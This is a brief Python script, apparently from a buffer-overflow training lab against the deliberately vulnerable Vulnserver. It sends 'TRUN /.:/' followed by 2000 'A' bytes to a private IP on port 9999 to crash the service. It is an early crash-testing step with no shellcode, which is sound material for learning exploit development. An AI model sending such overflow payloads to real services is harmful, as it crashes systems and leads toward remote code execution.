#!/usr/bin/python
import socket,sys
from time import sleep
target_ip="192.168.116.141"
port=9999
# Testing EAX for crash value
payload=b"TRUN /.:/"+b'A'*2000
try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip,port))
    s.send(payload)
    print("[+] " + str(len(payload)) + " Bytes Sent")
    s.close()
except:
    print("[-] Crashed")
    sys.exit()
    
